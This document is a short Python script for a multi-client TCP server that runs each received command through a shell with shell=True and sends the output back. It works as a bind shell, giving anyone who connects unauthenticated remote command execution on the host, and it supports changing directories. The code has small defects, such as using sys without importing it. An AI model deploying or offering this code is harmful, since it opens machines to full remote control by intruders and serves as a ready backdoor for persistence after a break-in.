#!/usr/bin/python
#
# Multi-client TCP server
# Provides a semi-interactive shell
# prompt will display the current working directory
# and lets user 'cd' into other locations

import socket
import os
import argparse
from subprocess import *


def reaper():                              
    while activePID:                        
        pid,stat = os.waitpid(0, os.WNOHANG)     
        if not pid: break
        activePID.remove(pid)


def handler(connection):                    
                          
    while True:                                    
        cmd = connection.recv(socksize)
        proc = Popen(cmd,
              shell=True,
             stdout=PIPE,
             stderr=PIPE,
              stdin=PIPE,
              )
        stdout, stderr = proc.communicate()

        if cmd.startswith("cd"):
            destination = cmd[3:].replace('\n','')
            if os.path.isdir(destination):
                os.chdir(destination)
                connection.send("shell "+str(os.getcwd())+" => ")
            else:
                connection.send("[!] Directory does not exist") 
                connection.send("shell "+str(os.getcwd())+" => ")

        elif proc:
            connection.send( stdout )
            connection.send("shell "+str(os.getcwd())+" => ")

    connection.close() 
    os._exit(0)


def accept():                                
    while 1:   
        global connection                                  
        connection, address = server.accept()
        print("[!] New connection!")
        connection.send("shell "+str(os.getcwd())+" => ")
        reaper()
        childPid = os.fork()
        if childPid == 0:
            handler(connection)
        else:
            activePID.append(childPid)


help = """Starts a TCP server on addr:port. Server can handle multiple incoming connections at once"""

parser = argparse.ArgumentParser(description=help)
parser.add_argument('--addr', help='listen IP', default='')
parser.add_argument('--port', help='listen port', required=True, type=int)
args = parser.parse_args()


HOST = args.addr
PORT = args.port
socksize = 4096
activePID = []

server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR,1)
try:
    server.bind((HOST, PORT))
    server.listen(10)
    print("[*] Listening for connections...")
except:
    print("[!] Could not establish connection!")
    sys.exit()

accept()

